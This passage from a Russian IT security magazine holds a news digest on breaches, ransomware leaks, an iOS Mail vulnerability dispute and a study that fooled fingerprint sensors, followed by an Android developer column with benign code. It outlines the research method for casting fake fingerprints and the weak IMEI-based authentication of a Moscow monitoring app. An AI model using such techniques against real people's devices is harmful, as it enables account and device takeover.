  за чужой счет, но чаще всего приобретали игровую валюту Fortnite через при‐
  вязанную к профилю Nintendo карту или акка унт PayPal.
    При этом было не ясно, как именно зло умышленни ки взламывают акка‐
   унты. Рассматривалась вероятность, что хакеры используют атаки типа cre‐
   dential stuﬃng, но это лишь одна из теорий. Напомню, что таким термином
  обозначают ситуации, ког да имена пользователей и пароли похищаются
  с одних сайтов, а затем используются против других. То есть злоумышленни‐
   ки имеют уже готовую базу учетных данных (приобретенную в даркнете, соб‐
  ранную самостоятельно и так далее) и пыта ются использовать эти данные,
   чтобы авторизоваться на каких‐либо сайтах и сервисах под видом своих
   жертв. Однако многие пострадавшие сооб щали, что использовали для своих
   учетных записей сложные и уникальные пароли, в том числе созданные
  с помощью парольных менеджеров.
    В итоге компания Nintendo все же подтвердила факт атак и сообщила, что
  неизвестные злоумышленники взло мали учетные записи примерно 160 тысяч
  пользователей. Как выясняется, проблема действительно заключалась не в
   атаках credential stuﬃng и переборе наиболее распространенных комбинаций
   учетных данных.
     Игровая компания утвержда ет, что хакеры вместо этого вос пользовались
  интеграцией с NNID, то есть Nintendo Network ID, чтобы получить доступ
   к чужим профилям. NNID — это устаревшая логин‐система, используемая
  для управления учетными записями на ста рых плат формах Wii U или Nintendo
  3DS. На новых устрой ствах Nintendo пользователи также могут связать свои
   старые учетные записи NNID с профилем Nintendo.
     Представите ли Nintendo не уточнили, что именно произошло, но заявили,
   что NNID больше не поддерживается и войти таким образом в основной про‐
  филь Nintendo не получится.
     Nintendo предупреждает своих клиентов, что хакеры могли получить дос‐
   туп к информации учетной записи, такой как никнейм, дата рождения, страна,
  регион и адрес элек тронной почты. Компания уже связывается с пострадав‐
  шими, чтобы инициировать сброс паролей как для основных учетных записей,
   так и для учетных записей NNID.


  18 000 000 «КОРОНАВИРУСНЫХ» ПИСЕМ


   Разработчики Google адап тируют машинное обучение для борьбы с мошенниками, киберпрес‐
   тупниками и правительственными хакерами, которые активно используют тему пандемии
   коронавируса для фишинговых атак.

   Только за одну неделю ком пания заблокировала более   000 000 фишинговых писем, свя‐   занных с COVID‐19 и нацеленных на пользовате лей Gmail.18

   Такой «коронавирусный» фишинг составляет примерно 2,5% от 100 000 000 фишинговых
   писем, которые Google блокирует ежедневно.

   Также разработчики сообщили о блокировании 240 000 000 ежедневных спам‐сообщений,
   связанных с COVID‐19.





 НЕНАДЕЖНЫЕ
 ОТПЕЧАТКИ
  Считается, что биометрическая аутентифика ция — это более безопасная
  альтернатива традиционным паролям. Аутентифика ция пос редс твом отпе чат‐
   ков пальцев в настоящее время наиболее распространенная форма биомет‐
  рии и используется в смартфонах, ноут буках и других устройствах, таких
   как умные замки и USB‐накопители.
    Однако проведенное экспертами Cisco Talos исследование показало, что
   в 80% случаев аутентификацию с помощью отпечатков пальцев можно
  без труда обойти.
     Для своих тестов исследователи брали отпечатки пальцев непосредствен‐
  но у целевого пользователя устройства или с поверхностей, к которым прит‐
  рагивалась потенциальная жертва. При этом специалисты установили отно‐
  сительно низкий бюджет для это го исследова ния, чтобы определить, чего
  может достичь атакующий с огра ниченными ресурсами. Так, в общей слож‐
  ности они потратили около 2000 долларов на тес тирование устройств Apple,
   Microsoft, Samsung, Huawei и дру гих.
     Эксперты обрабатывали полученные отпечатки фильтрами для повыше ния
  контрастности, использовали 3D‐прин тер для создания слепков, а затем
  формировали поддельный отпечаток, запол няя эту форму недорогим кле ем.
  При работе с емкостными датчиками материалы также должны были включать
   графит и алю миниевую пудру для увеличения проводимости.





  Аналитики проверили поддельные отпечатки пальцев на оптических, емкос‐
   тных и ультразвуковых дактилос копических сканерах, но не обнаружили
   каких‐либо существенных различий с точки зрения безопасности. Зато в Cis‐
  co Talos отмечают, что дос тигли наилучших показателей, атакуя ультраз‐
  вуковые сенсоры — новейший тип, обычно они встроены прямо в дисплей
  устройства.
     Легче всего обмануть при помощи фальшивых отпечатков пальцев уда‐
  лось замок AICase, а также смартфо ны Huawei Honor 7x и Samsung Note
  9 на базе Android. Для этих девайсов атаки были успешными в 100% слу чаев.
  Почти столь же успешными были атаки на iPhone 8, MacBook Pro 2018 и Sam‐
  sung S10, где показатель успеха сос тавил более 90%. Пять моделей ноут‐
  буков под управле нием Windows 10 и два USB‐накопителя (Verbatim Finger‐
   print Secure и Lexar JumpDrive F35) показали наилучшие результаты: обмануть
   их при помощи фальшивки не удалось.


                                        Продолжение статьи →
← Начало статьи





  Таким образом, в случае с мобильными телефонами иссле дователи обошли
   аутентификацию по отпечаткам пальцев на подавляющем большинстве
  устройств. На ноутбуках удалось добиться 95% успеха (особенно легко было
  с MacBook Pro), а вот обойти защиту устройств с Windows 10 на борту,
  использующих фреймворк Windows Hello, не получи лось вовсе.
     Аналитики пишут, что, хотя обмануть биомет рическую аутентификацию
  на Windows‐машинах и USB‐накопителях им не уда лось, это еще не означает,
   что они так хорошо защищены. Прос то для их взлома нужен другой под ход.
  Вряд ли они устоят перед ата кующим с хорошим бюджетом, большим
  количеством ресурсов и профес сиональной командой.
     Хотя Samsung A70 тоже про демонстри ровал стойкость, исследователи
  объясняют, что его биометричес кая аутентифика ция попросту работает край‐
  не плохо и зачастую не рас познает даже реаль ные отпечатки пальцев,
  которые были зарегистрирова ны в системе.
    Основываясь на полученных результатах, специалисты делают вывод, что
   технология аутен тификации по отпечат кам пальцев еще не достигла уровня,
  после которого ее можно будет считать надежной и безопасной. Фактически
  исследователи пишут, что аутентификация по отпечаткам пальцев на смар‐
  тфонах стала слабее по сравнению с 2013 годом, когда компания Apple пред‐
   ставила Touch ID для iPhone 5, а затем эта система была взломана.



         «Результаты показы вают, что отпе чатки пальцев дос таточ но хороши,
         чтобы защитить лич ную жизнь рядового челове ка, если он потеряет
         свой телефон. Одна ко человек, который может стать мишенью хорошо
        финансиру емого и мотивированного ата кующе го, не должен исполь-
         зовать аутентифика цию по отпе чаткам пальцев.
          Для обыч ного пользовате ля аутентифика ция по отпе чатку пальца
        име ет оче вид ные пре иму щес тва и пред лагает инту итив но понятный
         уровень безопас ности. Одна ко если пользователь ока зался потен-
         циальной целью для злоумыш ленников с хорошим бюд жетом, а его
         устройство содер жит конфиденциальную информа цию, мы рекомен-
        дуем полагаться на надежные пароли и двухфактор ную аутентифика-
       цию на основе токенов», — резюмируют экспер ты Cisco Talos.


 ДЫРЫ МОБИЛЬНОГО БАНКИНГА
   Эксперты Positive Technologies изучили банковские мобильные приложе ния и выяс нили, что
   более половины всех уязвимос тей содержатся в серверных час тях приложе ний, а в каж дом вто‐
   ром мобильном банке возможны мошеннические операции и кража денежных средств.

  Было изучено 14 полнофункциональных бан ковских мобильных приложений для Android и iOS,
   загруженных из официальных магазинов Google Play и App Store не менее 500 000 раз.

  Ни одно из исследованных мобильных бан ковских приложений не обладало при емлемым
   уровнем защищенности.

  43% приложений хранят важные дан ные на мобильном устройстве в открытом виде. При этом
  76% уязвимостей можно эксплуатировать без физичес кого доступа к устройству, а более 1/3
   уязвимостей не требуют административных прав.


   Все недостатки, выявленные в мобильных бан ках для iOS, были не выше среднего уров ня рис‐
    ка. 29% приложений для Android содержали уязвимос ти высоко го уровня риска.





                          Доля уязвимостей различного уровня риска

  54% всех уязвимостей содержатся в серверных час тях мобиль ного бан ка, а серверная часть
   каждого мобильного банка содержит в среднем 23 уязвимос ти. При этом 3 из 7 серверных час‐
   тей приложений имеют ошибки бизнес‐логики.





                        Среднее количество уязвимостей на одно приложение

  В каждом вто ром мобильном бан ке возможно проведе ние мошеннических операций. Наибо‐
   лее уязвимыми в мобильных бан ковских приложениях оказались аутен тификационные
  данные.

   К счастью, для эксплуатации 87% уязвимостей злоумышленнику требуются действия со сто‐
   роны пользователя.





                                     Топ‐10 проблем в приложениях





 БОЛЬШОЙ СЛИВ
 DOPPELPAYMER
  Операторы вымогателя DoppelPaymer опубликова ли в Сети данные, похищен‐
  ные у промышленного подрядчика Visser Precision, так как компания не зап‐
  латила выкуп.
    Напомню, что в последние месяцы операто ры шифровальщиков стали все
  чаще публиковать в открытом дос тупе данные, похищенные у пос традавших
  компаний. Такая информа ция может включать финансовые документы ком‐
   пании, личную информа цию сотрудников и клиентские данные.
     Разработчики малвари призывают аффи лированных лиц копировать дан‐
  ные жертв перед шифрованием, чтобы затем эту информацию можно было
  использовать в качестве рычага давления (а если это не поможет, обнародо‐
   вать или продать). Собственные сайты для этих целей уже завели разработ‐
   чики вымогателей Maze, DoppelPaymer, Sodinokibi (REvil) и другие.
    Компания  Visser  Precision, пострадавшая  от  атаки  DoppelPaymer, —
   это один из крупнейших подрядчиков в США, в число клиентов которого вхо‐
   дят промышленные предприятия, а также компании аэрокосмической и авто‐
  мобильной отрасли (например, Lockheed Martin, SpaceX, Tesla, Boeing, Hon‐
   eywell, Blue Origin, Sikorsky, Joe Gibbs Racing).
     DoppelPaymer атаковал Visser Precision в марте текуще го года. Так как ком‐
  пания не заплатила выкуп в установленный срок (как правило, вымогатели
  требуют сотни тысяч или даже миллионы долларов за восстановление
  зашифрованных файлов), зло умышленники прет ворили свои угрозы в жизнь
  и опубликовали в открытом доступе подборку похищенных документов.
     Утечка затронула данные таких клиентов Visser Precision, как Tesla, Lock‐
  heed Martin, Boeing и SpaceX. Изда ние The Register пишет, что среди обна‐
  родованной документации можно найти закрытую информацию о военном
  оборудовании, разработанном Lockheed Martin, например спецификации
  антенны для системы защиты от минометов. Также была опубликована
  финансовая документация, информа ция о поставщиках, отчеты об анализе
  данных и юридические документы.
    Журналисты обратились за коммента рием ко всем пострадавшим ком‐
  паниям, но отве тов от Visser Precision, Tesla, SpaceX и Boeing не получили.
  Лишь представители Lockheed Martin сообщили изданию, что им извес тно
  о ситуации с Visser Precision, и в нас тоящее время компания следует стандар‐
   тному процессу реагирова ния на потенциальные киберинциденты, связанные
  с цепочкой поставок.



         «Lockheed Martin вкла дыва ла и продолжает вкла дывать зна чительные
        средс тва в кибер безопас ность и использует лидиру ющие в отрасли
        методы в области защиты конфиденциальных данных. Когда это умес-
          тно, мы  готовы пре дос тавить нашим пос тавщикам рекомендации
        и  ока зать им помощь  в повыше нии  их  уров ня информа ционной
         безопас ности», — говорят в Lockheed Martin.


  14 УЯЗ ВИМОСТЕЙ НА ОДНОЙ МАШИНЕ


   Эксперты Kenna Security проанализировали, как меняется лан дшафт атак в зависимости
   от используемой жертвой опе рационной сис темы. Для этого иссле дователи изу чили данные,
   полученные с 9 000 000 устройств из 450 различных компаний и организаций.

  Выяснилось, что более 50% компаний используют различные версии Windows и лидирует сре‐
   ди них Windows 10 с показателем 85%.

  В общей сложности на машинах под управле нием Windows 10 эксперты выяви ли более
   215 000 000 уязвимостей.

  В среднем на одну машину с Windows 10 приходится 14 уязвимостей, которые используют
   преступники. То есть эксплоиты для этих проблем написаны и активно применяются.





 НУЛЕВОЙ ДЕНЬ В IOS
  Специалисты компании ZecOps со общили о 0day‐уязвимости в iOS, которая,
  по их данным, исполь зовалась хакерами с 2018 года или даже дольше. В час‐
  тности, проблему  удалось воспроизвести даже  в iOS  6, выпущенной
   в 2012 году.
    Иссле дователи  писали,  что  эксплуатация  уязвимости  не  требует
  какого‐либо взаимодействия с пользователем и злоумышленникам достаточ‐
  но просто отправить жертве вредоносное письмо. Если пользователь получит
  почту или откроет Apple Mail, экс плоит сработает. При этом для Gmail и дру гих
  почтовых клиентов атака неактуальна.
    В своем отчете эксперты ZecOps подчеркивали, что уязвимость уже давно
   эксплуатируют хакеры. В частности, исследова тели обнаружили попытки атак
  на частных лиц и компании из списка Fortune 500 в Северной Аме рике,
  руководство японской компании‐перевозчика, германского поставщика услуг
  управляемой безопасности, европейского журналиста и так далее. При этом
  отмечалось, что обнаруженные ата ки хорошо подходят под «профиль» одной
  известной правительственной хак‐груп пы, но ее наз вание не рас крывалось,
   так как эксперты все же опа сались ошибиться с атрибуцией.
    В ответ на это эксперты Apple сделали официальное заявление. Как пишут
  инженеры компании, они тщательно изу чили информацию о найденных спе‐
  циалистами проб лемах и считают, что эксперты ошиблись — уязвимости
  не использовались для атак на пользователей. При этом, что проблемы дей‐
   ствительно есть, компания не отрицает.



         «К любым сообщениям об угрозах безопас ности Apple относится
         серьезно. Мы тща тельно изу чили отчет иссле дова телей и, основыва-
         ясь на пре дос тавленной информа ции, приш ли к выводу, что эти проб-
       лемы не пред став ляют непос редс твенного рис ка для наших поль-
         зовате лей. Иссле дова тели выявили три проблемы в  [Apple]  Mail,
        но сами по себе они не могут использоваться для обхода средств
        защиты iPhone и iPad, и мы не наш ли доказа тельств того, что они при-
        менялись против наших клиентов. Эти потенциальные проблемы будут
         устра нены в ближайшее вре мя с обновле нием ПО. Мы ценим учас тие
        ИБ‑иссле дова телей, которые стре мятся помочь обес печить безопас-
         ность наших пользовате лей, и обязательно выразим им бла годар ность
         за помощь и учас тие», — пишут экспер ты Apple.

  Стоит сказать, что опубликованные ZecOps заявления вызвали немало воп‐
  росов и у ИБ‐специалистов. Так, некоторые эксперты вырази ли крайние сом‐
  нения в том, что обнаруженные ошибки могли использоваться против поль‐
  зователей в реальной жизни.
    Дело в том, что исследование ZecOps основывалось на crash‐логах, обна‐
  руженных на якобы пострадавших устройствах. Данные из этих логов были
  интерпретированы как попыт ки экс плуатировать баг и атаковать пользовате‐
   ля. В частности, эксперты ZecOps писали, что неудачные попытки атак
  оставляли после себя пустые пись ма и crash‐лог устройства. Тогда как удач‐
  ные атаки якобы заканчивались уда лени ем пус тых электронных писем, чтобы
  скрыть атаку от поль зователя.





  Но другие ИБ‐специалисты отмечали, что, если бы злоумышленники удаляли
   пустые электронные пись ма для сокрытия следов, скорее всего, они уда‐
  ляли бы и crash‐логи с пострадавших девай сов. Поэтому многие заключили,
   что аналитики ZecOps наш ли «испорченные» электронные письма, появив‐
  шиеся из‐за обыч ного бага, а не зло намеренные ата ки на пользовате лей iOS.
  Заявление Apple лишь подтвердило эти выводы.
    В свою очередь, специалис ты ZecOps пообе щали опубликовать допол‐
  нительную информацию об уязвимос тях и PoC‐экс плоит, как только патч ста‐
   нет доступен для всех пользователей iOS. Так, 15 апреля 2020 года Apple
  выпустила  бета‐версию iOS  13.4.5,  где  уязвимости были исправлены,
  и теперь остается дождаться релиза стабильной версии iOS 13.4.5 в ближай‐
  шие недели.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Сеть отелей Marriott сообщила об утечке данных, затронувшей 5,2 мил лиона пос тояльцев


   Неизвестные дефей снули и стерли данные с 15 тысяч серверов Elasticsearch


   Из‐за взлома почтового провайдера данные 600 тысяч человек попали в продажу в даркне те


   Эксперты разобрались, почему троян xHelper практичес ки невозможно удалить с устройства


  NSO Group утверждает, что Facebook пыталась купить ПО для слежки за пользовате лями


   WhatsApp ограничил пересылку популяр ных сооб щений ради борьбы с фейками


   Эксперты придумали, как удален но заставить 3D‐принтер загореться


   Власти США предложили 5 миллионов долларов за информацию о северокорейских хакерах


   Группировка ICEBUCKET имитировала умные телевизоры, чтобы заработать на рек ламе


   Уязвимость Starbleed представляет угрозу для чипов FPGA
HEADER
  ANDROID

     СОЦИАЛЬНЫЙ МОНИТОРИНГ
      И СОВЕТЫ ОТ MICROSOFT





Сегодня в выпуске: защита приложения
с помощью проверки цифровой подписи
в нативной библиотеке, анализ приложения
«Социальный мониторинг», рассказ о том,
как новые вер сии Android экономят заряд          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
батареи, статья о вредности System.exit(),              zobnin@glc.ru
советы, как сократить размер приложения
и оптимизировать использование батареи,
реализация обновления приложения через
само  приложение,  надежный  способ
показать клавиатуру, а также подборка пла‐
гинов Android  Studio, инструментов пен‐
тестера и библиотек для разработчика.


ПОЧИТАТЬ
Защита приложе ния с помощью про верки цифровой под писи
Yet Another Tamper Detection in Android — статья о том, как защитить приложе‐
ние с помощью проверки цифровой подписи в нативной библиотеке.
  Лю бое приложение для Android имеет цифровую подпись, с помощью
которой можно подтвердить его авторс тво. Проб лема лишь в том, что циф‐
ровая подпись сверяется только во время обновления приложения (подписи
не совпадают — обновить нельзя), но не его первой установки. Это значит,
что взломщик может разобрать любое приложение, взломать его или внед‐
рить новую функциональность, а затем соб рать с использованием своего
клю ча. А пользователь спо койно его установит, при необходимости удалив
оригинальную вер сию приложения.
  Бороться с пиратством можно, внедрив код про верки цифровой подписи
прямо в само приложение. При старте приложение получает свою собствен‐
ную цифровую подпись, сравнивает ее с сохраненным образцом и, если они
не совпадают, завершает само себя, показав сообщение о пиратстве.
  Недостаток это го подхода в том, что для сверки контрольной суммы
используются стандартные API Android (packageManager.getPackageInfo),
ориентируясь по которым взломщик может найти код сверки контрольной
суммы и просто вырежет его из приложения.
   Автор статьи предлага ет разместить данный код в написанной на языке
С библиоте ке. Вместо API Android эта биб лиотека использует собственные
средства сверки цифровой подписи (в час тности, код из библиотек libzip
и mbed TLS). Также в библиотеке применен ряд средств защиты от реверса,
таких  как  собственные  реализации функций  libc  и  позаимствованный
из OpenSSL способ определить, что код биб лиотеки изменен.
  Последний работает так: при сборке в секции text (содержит код) и rodata
(содержит константы, включая хеш сертифика та) вставляются специальные
маркеры, которые помеча ют начало и конец секции. Далее вычисляется
HMAC для данных между этими маркерами и записы вается в секцию данных.
Во время вызова функции сверки цифровых подписей биб лиотека проверя ет
собственную целостность с помощью HMAC.
  Код проекта опубликован на GitHub.


Анализ приложе ния «Социальный монито ринг»
JaDX decompile  of com.askgps.personaltrackercore — декомпилированные
исходники приложения «Социальный мониторинг», соз данного по заказу
мэрии Москвы за 180 миллионов рублей. Приложение получило в сред нем
одну звезду и было удалено из Google Play меньше чем через сутки после
публикации.
   Изучая исходники, мож но  заметить,  что при ложе ние не применяет
никакой, даже самой прос той обфускации и передает данные на сервер
мэрии Москвы в открытом виде (голый HTTP, без шифрования), а в качес тве
метода аутентификации использует IMEI (зная IMEI смартфона жертвы, зло‐
умышленник может «отпра вить» его на дру гой край страны, сменить фотку
и другие сведения).
  Для распознавания лиц приложение использует эстонский сервис iden‐
tix.one, на который, судя по всему, раз работчики залили фотографии всех
жителей РФ. Это значит, что, имея на руках токен сервиса, выдранный из при‐
ложения, злоумышленник мог бы использовать сервис для идентификации
людей по фотографии. К счастью, все API уже закрыты.
  Примерно через неделю свой аналог «Социаль ного мониторинга» выпус‐
тило уже Минкомсвязи. Госуслуги СТОП корона вирус (ис ходники) оказалось
более качественным и таких зияющих дыр уже не содержало. Что, впрочем,
не помешало ему получить среднюю оценку в 1,6 звез ды.





              Запрашиваемые приложением разрешения


Как новые версии Android эко номят заряд батареи
App Standby Buckets In Android — небольшая замет ка о функции App Standby
Buckets, появив шейся в Android 9.
  App Standby Buckets — новая энергосберегающая функция, рас ширяющая
и дополняющая механизм Doze, работа ющий с Android 6. Идея на этот раз
состоит в том, чтобы раз делить все установленные на смартфоне приложе‐
ния на категории в зависимости от того, нас коль ко часто они используются.
  Основных категорий пять:
 • Active — приложение используется в данный момент или использовалось
   совсем недавно;
 • Working set — часто используемые приложения;
 • Frequent — регулярно используемые приложения, но не обязательно
   каждый день;
 • Rare — редко используемые приложения;
 • Never — приложение уста новлено, но ни разу не запускалось.

В простейшем случае Android группирует приложения по категориям, осно‐
вываясь на вре мени пос леднего запуска, но про изводитель смартфона
может использовать другие способы груп пировки. Например, в смартфонах
Google Pixel для этих целей приспособлена нейронная сеть.
  В зависимости от груп пы система применя ет к приложениям различные
ограничения, включая огра ничения на запуск фоновых задач (Jobs), срабаты‐
вание таймеров (Alarm), доступность сетевых функций и push‐уведомлений
(Firebase Cloud Messaging — FCM):


      Группа: Active

       Jobs: Без огра ничений

        Alarms: Без огра ничений

       Сеть: Без огра ничений

      FCM: Без огра ничений


      Группа: Working set

       Jobs: Задержка до 2 часов

        Alarms: Задержка до 6 минут

       Сеть: Без огра ничений

      FCM: Без огра ничений


      Группа: Frequent

       Jobs: Задержка до 8 часов

        Alarms: Задержка до 30 минут

       Сеть: Без огра ничений

      FCM: 10 в день


      Группа: Rare

       Jobs: Задержка до 24 часов

        Alarms: Задержка до 2 часов

       Сеть: Задержка до 24 часов

      FCM: 5 в день



Интересный побочный эффект этой системы в том, что если все взаимодей‐
ствие пользователя с приложением будет сво диться только к прочтению
и смахиванию уведомлений, то через нес колько дней приложение перейдет
в группу Rare и будет серь езно урезано в воз можнос тях.
   Также следует иметь в виду, что приложение не будет урезано в правах,
если находится в списке исключений системы энергосбережения или если
телефон на зарядке.


РАЗРАБОТЧИКУ
По чему не сто ит использовать System.exit()
A cautionary tale on Android: do not call System.exit() — небольшая статья о том,
почему не стоит использовать System.exit() в своем приложении.
  Документация Android говорит, что метод System.exit() (и его экви‐
валент в Kotlin: exitProcess()) делает следующее: завершает текущую вир‐
туальную машину и сообщает системе, корректным ли было завершение (0 —
все нормально, больше нуля — произош ло что‐то плохое).
   Так как в Android каждое приложение исполня ется в собственной вир‐
туальной машине, можно предположить, что System.exit(), по сути, при‐
водит к полному уничтожению приложения. Это действительно так, но есть
один нюанс: если в момент вызова у при ложения были другие активности
в состоянии paused, то они оста нутся в стеке активнос тей. Это, в свою оче‐
редь, приведет к тому, что после вызова System.exit() будет уничтожена
текущая активность и само приложение, а затем сис тема вернет управле ние
предыдущей активности приложения. Но так как приложение уже мертво, сис‐
тема перезапустит его, чтобы показать активность.





               Что происходит после вызова System.exit()

Решить эту проблему в большинстве случаев можно, используя метод fin‐
ishAffinity(), который приводит  к корректному завершению текущей
активности приложения, а также всех активнос тей с тем же значением aﬃnity.
Так как по умолчанию Android назначает всем активнос тям при ложе ния оди‐
наковый aﬃnity, равный имени пакета при ложения, это приведет к закрытию
всех активностей.


Со веты, как уменьшить раз мер приложе ния
App size reduction at Microsoft SwiftKey — сборник заметок разработчиков кла‐
виатуры SwiftKey (Microsoft) о том, как сократить раз мер скачиваемого и уста‐
новленного приложения.
   1.  Установленное приложение  весит намного больше  скачиваемого
потому, что во время уста новки Android сохраня ет в памяти устройства
не только сам APK‐файл, но и некоторые извлеченные из него компоненты:
верифицированный файл DEX (VDEX — Veriﬁed DEX) и нативные библиоте ки.
Также через некото рое время виртуальная машина создает файл ODEX —
оптимизированную версию файла DEX, пропущенную через AOT‐компилятор
(некоторые части байт‐кода заменяются на машинные инструкции). При чем
начиная с Android 9 этот файл может быть получен сра зу из Google Play.





В целях тестирования файл ODEX можно соз дать принудительно:


adb shell cmd package compile ‐m speed‐profile ‐f имя.пакета

2. В случае со SwiftKey помогли следующие флаги ProGuard: repackageclass‐
es, renamesourceﬁleattribute и allowaccessmodiﬁcation. Но появился побочный
эффект: еще большее запутывание стек‐трейсов в системе анализа сбоев.
   3. Компилятор R8 (в новых версиях Android Studio включен по умол чанию)
сократил размер установленного приложения на 1,3 Мбайт, но замедлил вре‐
мя его старта.
   4. По умолчанию при сборке приложения среда раз работки сжимает
нативные библиотеки. При установке приложения на устройство Android рас‐
паковывает библиотеки в специальный каталог с данными приложения.
Это приводит к допол нительному рас ходу прос транства устройства. Чтобы
поменять такое поведение и заставить Android использовать библиотеки пря‐
мо из пакета, следует внес ти два изменения в проект.
  В файл build.gradle добавить такие стро ки:


android {
    aaptOptions {
        noCompress 'so'
        ...
    }
    ...
}

В AndroidManifest.xml — такие:


<application android:extractNativeLibs="false" ...>

Имей в виду, что некоторые библиотеки, например SoLoader, будут рас‐
паковывать библиотеки принудитель но, нес мотря на используемые опции.
   5. По умолчанию при обфускации/минимизации приложения среда раз‐
работки удалит все неиспользуемые ресурсы. Также ты можешь удалить их
с помощью опции Android Studio: Refactor → Remove Unused Resources.
   6. Используемое приложением место можно сократить, преобразовав
изображения в формат WebP (клик правой клавишей на папке drawable, затем
пункт Convert to WebP). Экономия сос тавит примерно 25%. Еще большего
выигрыша можно достигнуть, заменив растро вые изображения на векторные.
Однако в этом случае авто матичес ки преобразовать их не получится.
   7. При сборке среда разработки помещает все используемые приложе‐
нием строки в файл resources.arsc. Туда попадают строки на всех язы ках,
вклю чая строки из используемых в проекте биб лиотек. Проблема здесь в том,
что, если библиотека переведена на большее количество языков, чем само
приложение, строки на этих языках все равно попадут в пакет. Избавиться
от них можно, перечислив используемые приложением язы ки в конфиге
Gradle:


android {
    defaultConfig {
        resConfigs "en", "es"
    }
}

Теперь в приложение попадут строки только на английском и испанском.
   8. Хороший выигрыш в раз мере загружаемого приложения даст исполь‐
зование App Bundle. Новые версии Android Studio по умол чанию предлагают
собирать приложение в App Bundle вмес то клас сичес кого APK. Bundle затем
можно залить в Google Play, и он автоматически будет разбит на несколько
APK для разных платформ, включая отдельные дополнительные APK для раз‐
ных языков и регионов. В этом случае итоговый размер пакета, который заг‐
ружает на смартфон пользователь, обычно становится намного меньше.
  Все эти техники позволили сократить раз мер пакета SwiftKey на 50%
(с 27,6 до 14,3 Мбайт), а занимаемое мес то после установки — на 40%
(с 81,5 до 48 Мбайт).


Со веты, как изме рить потребле ние батареи
Android Battery Testing at Microsoft YourPhone — еще один материал разработ‐
чиков из Microsoft. На этот раз авторс тво при надлежит команде приложе ния
YourPhone (того, что поз воляет управлять телефоном из Windows), а статья
посвящена изме рению потребления батареи.
   Большая часть статьи — вода, но в конце есть мякотка — скрипт
для запуска тестирования батареи и часть кода для парсинга результатов
работы скрипта. Код скрипта:


# Эмулируем отключение смартфона от источника питания
adb shell dumpsys unplug
# Сбрасываем статистику использования батареи
adb shell dumpsys batterystats ‐‐reset
# Запускаем тесты
...
# Останавливаем тесты
# Получаем статистику работы батареи (вывод этой команды надо
сохранить)
adb shell dumpsys batterystats
# Отключаем эмуляцию отключения от источника питания
adb shell dumpsys batterystats reset

Далее результат работы команды dumpsys batterystats reset можно про‐
парсить,  чтобы  получить сводные данные об  использовании  батареи.
В статье приведен фраг мент приложения на C#, которое выводит такой
результат:


Total Usage: 62.1mAh
Cpu Usage: 1.21mAh
Wifi Usage: 60.9mAh
Wakelock Usage: 0mAh
Bluetooth Usage: 0mAh

Разумеется, его можно переписать на любом дру гом языке.


Правильный спо соб показать клавиату ру
Showing the Android Keyboard Reliably — статья раз работчиков Square о том,
как показать клавиатуру и не получить проб лем.
   Суть проблемы: в Android есть способ форсировать показ клавиатуры
без необходимости дожидать ся, пока пользователь кликнет на поле ввода:


val imm = context.getSystemService(Context.INPUT_METHOD_SERVICE) as
InputMethodManager
imm.showSoftInput(editText, InputMethodManager.SHOW_IMPLICIT)

Он работает, но толь ко в том случае, если поле ввода (в данном случае —
editText) будет иметь фокус в момент вызова метода showSoftInput().
Это ограничение можно обойти, передав методу showSoftInput() флаг In‐
putMethodManager.SHOW_FORCED. Но тогда клавиатура не будет спря тана
автоматически и останет ся на экра не, например, если пользователь свернет
приложение.
   Статья описывает способ обхода  этих проб лем. Тебе необходимо
повесить на поле вво да листенер, который сра ботает, когда поле ввода
получит фокус, и в этот момент покажет клавиату ру.
  Код функции‐расширения, которая корректно показывает  клавиатуру
во всех случаях:


fun View.focusAndShowKeyboard() {
   fun View.showTheKeyboardNow() {
       if (isFocused) {
           post {
               val imm = context.getSystemService(Context.INPUT_
METHOD_SERVICE) as InputMethodManager
               imm.showSoftInput(this, InputMethodManager.SHOW_I
MPLICIT)
           }
       }
   }


   requestFocus()
   if (hasWindowFocus()) {
       showTheKeyboardNow()
   } else {
       viewTreeObserver.addOnWindowFocusChangeListener(
           object : ViewTreeObserver.OnWindowFocusChangeListener {
               override fun onWindowFocusChanged(hasFocus: Boolean) {
                   if (hasFocus) {
                       this@focusAndShowKeyboard.showTheKeyboardNow()
                       viewTreeObserver.removeOnWindowFocusChang
eListener(this)
                   }
               }
           })
   }
}


Ре ализация In-App Updates
In‐App Updates: Getting Started — большой туториал по реализации In‐App Up‐
dates — функции, с помощью которой приложение может принудительно
обновить себя или вывести уведомление об обновлении.
  Функция реализована в библиотеке Google Play Core и предлагает два
способа обновления приложения: immediate и ﬂexible. Первый принудитель‐
ный: приложение автоматически запускает обновление, а пользовате лю
остается только наблюдать. Второй поз воляет проверить наличие обновле‐
ния и вывести сооб щение/уведомление/кноп ку, нажав на которое поль‐
зователь может самостоятельно запус тить про цесс обновления.
  И в том и в другом случае проверить, есть ли новая версия, и запус тить
обновление очень просто. Нап ример, принудительно обновить можно все го
в несколько строчек:


private const val REQUEST_UPDATE = 100


fun checkForUpdate(activity: Activity) {
    val appUpdateManager = AppUpdateManagerFactory.create(getApp
Context())
    val appUpdateInfo = appUpdateManager.appUpdateInfo
    appUpdateInfo.addOnSuccessListener {
        handleImmediateUpdate(activity, appUpdateManager, appUpd
ateInfo)
    }
}


private fun handleImmediateUpdate(activity: Activity, manager: AppUpd
ateManager, info: Task<AppUpdateInfo>) {
    if ((info.result.updateAvailability() == UpdateAvailability.
UPDATE_AVAILABLE ||
                    info.result.updateAvailability() == Update
Availability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS) &&
            info.result.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE))
 {


        manager.startUpdateFlowForResult(info.result, AppUpdateType.
IMMEDIATE, activity, REQUEST_UPDATE)
    }
}

Все, что делает этот код, — проверяет, есть ли обновление (UpdateAvail‐
ability.UPDATE_AVAILABLE), подходит ли оно для принуди тельной установки
(AppUpdateType.IMMEDIATE), и, если да, устанавлива ет его.
   Flexible‐обновле ния работа ют примерно так же с тем исключением, что
обновление можно запустить в фоне, а затем попросить пользователя
перезапустить приложение.


Под борка полез ных плагинов для Android Studio
The Top 20 Android Studio Plugins — обзор двадцати плагинов Android Studio
на все случаи жизни. Наиболее интересные экземпля ры:
 • Rainbow Brackets — рас крашивает парные скобки в разные цве та, упро‐
  щая поиск закрывающей/открывающей скобки;
 • ADB Idea — плагин, позволяющий быстро выполнить команды ADB: убить
   приложение, отозвать полномочия;
 • ADB Wifi — плагин для отладки смартфона без USB по Wi‐Fi;
